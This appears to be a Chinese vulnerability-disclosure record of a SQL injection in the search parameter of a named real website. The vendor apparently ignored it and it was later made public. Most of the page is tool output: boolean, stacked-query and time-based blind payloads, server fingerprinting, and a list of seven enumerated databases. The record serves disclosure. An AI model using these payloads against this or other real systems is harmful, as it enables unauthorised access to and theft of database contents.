漏洞详情 披露状态：   									2013-12-18：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-02-01：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql注入漏洞，信息量有点吓人 详细说明：    注入点   http://hbtc.cnhubei.com/Search.aspx?key=11%u90095   ---Place: GETParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=11%u90095%' AND 5458=5458 AND '%'='    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: key=11%u90095%'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: key=11%u90095%' WAITFOR DELAY '0:0:5'-----7个库  ---web server operating system: Windows Vistaweb application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008available databases [7]:[*] HBTYCP[*] master[*] model[*] msdb[*] SLCLoggingDatabase[*] SLS_JC[*] tempdb   漏洞证明：
